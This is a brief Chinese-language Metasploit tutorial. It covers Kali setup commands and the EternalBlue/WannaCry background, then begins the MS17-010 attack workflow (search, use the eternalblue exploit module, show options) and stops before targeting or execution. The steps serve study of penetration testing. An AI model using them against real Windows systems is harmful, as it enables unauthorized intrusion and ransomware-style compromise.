# metasploit

## 概述
> **msf** 是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的**shellcode**，并持续保持更新。 
:::warning
metasploit让复杂的漏洞攻击流程变的非常简单，一个电脑小白经过几小时的学习，
就能对操作系统等主流漏洞发起危害性攻击
:::


放大kali 终端字体 ctrl + shift + 加号

## metasploit 攻击 windows 操作系统

### msf 使用法则

1. 切换管理员用户：
 `sudo su`
 默认密码：kali

2. 查看 **metasploit** 命令行：
`msfconsole`
`msfdb init`

### 永恒之蓝漏洞
永恒之蓝是指**2017年4月14日**晚，黑客团体**ShadowBrokers** (影子经纪人)公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用**Windows** 系统的**SMB**漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了**wannacry** 勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件

### metasploit 攻击永恒之蓝全流程
1. 搜索微软模块
    `search ms17_010`
2. 使用模块 **use**
    > use exploit/windows/smb/ms17_010 eternalblue
    > 或 use 0
3. 设置必选项
    >查看必选项[**required** 为 yes的就是必选项]
    > `show options`